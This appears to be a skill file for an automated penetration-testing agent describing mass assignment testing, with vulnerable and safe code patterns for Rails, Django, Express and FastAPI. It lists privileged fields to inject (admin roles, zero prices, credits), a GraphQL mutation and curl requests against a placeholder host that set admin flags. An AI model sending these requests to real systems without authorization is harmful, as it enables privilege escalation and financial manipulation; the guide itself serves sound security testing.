---
name: mass_assignment
description: Mass assignment / parameter pollution vulnerability testing
applicable_contexts: [web, api]
---

## Mass Assignment Testing

### Concept

Application binds request parameters directly to internal model without filtering.
Attacker adds extra fields that modify privileged attributes.

### Discovery Methodology

1. Identify object creation/update endpoints (POST, PUT, PATCH)
2. Inspect API responses for fields not in the request (role, isAdmin, verified, etc.)
3. Add those fields to request body and observe behavior

### Common Target Fields

```json
{"role": "admin"}
{"isAdmin": true}
{"is_verified": true}
{"subscription_tier": "enterprise"}
{"credits": 99999}
{"email_verified": true}
{"account_type": "premium"}
{"permissions": ["admin", "write", "delete"]}
{"price": 0}
{"discount": 100}
{"approved": true}
{"active": true}
```

### Framework-Specific Patterns

#### Ruby on Rails
Without `strong_params`, all attributes assignable:
```ruby
# Vulnerable: User.new(params[:user])
# Safe: params.require(:user).permit(:name, :email)
```

#### Django
```python
# Vulnerable: form = UserForm(request.POST)
# Safe: class UserForm: fields = ['name', 'email']  # explicit whitelist
```

#### Express.js / Node.js
```javascript
// Vulnerable: User.create(req.body)
// Safe: const { name, email } = req.body; User.create({ name, email })
```

#### FastAPI / Pydantic
```python
# Vulnerable if schema includes admin fields
# Safe: separate schemas for create vs. internal (UserCreate vs UserInternal)
```

### GraphQL Mass Assignment

```graphql
mutation {
  updateUser(input: { name: "John", role: "admin" }) {
    id name role
  }
}
```

### Testing with Burp/curl

```bash
# Step 1: Normal request
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "email": "test@test.com"}'

# Step 2: Add privileged fields
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "email": "test@test.com", "role": "admin", "isAdmin": true}'

# Step 3: Check if role/admin flag was set
curl https://target.com/api/users/me -H "Authorization: Bearer TOKEN"
```

### Validation Requirements

- Show request with injected privileged field
- Show response or subsequent request confirming the field was set
- Document: which fields are vulnerable and what impact each has
- Test both creation and update endpoints

### Business Impact

- Privilege escalation (user → admin)
- Financial manipulation (price, credits, subscription tier)
- Authentication bypass (email_verified, approved flags)
- Data integrity compromise
